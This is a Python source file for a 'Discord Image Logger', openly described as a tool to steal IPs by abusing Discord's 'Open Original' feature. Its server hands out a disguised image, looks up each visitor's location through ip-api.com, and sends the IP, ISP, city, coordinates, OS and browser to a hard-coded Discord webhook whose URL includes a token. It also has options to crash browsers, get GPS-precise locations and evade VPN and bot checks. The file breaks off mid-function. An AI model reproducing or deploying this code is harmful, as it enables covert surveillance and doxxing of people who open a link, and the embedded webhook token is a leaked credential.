# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1455052799493800151/u3ru2dK_58PLrguELCjX6h3H4Swf0xGbNxfJmgXoAaA9nqCPA0V0EJWrQobcA2SDa5nA",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "RetardedSpeed67", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": false, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": false, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "Null", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

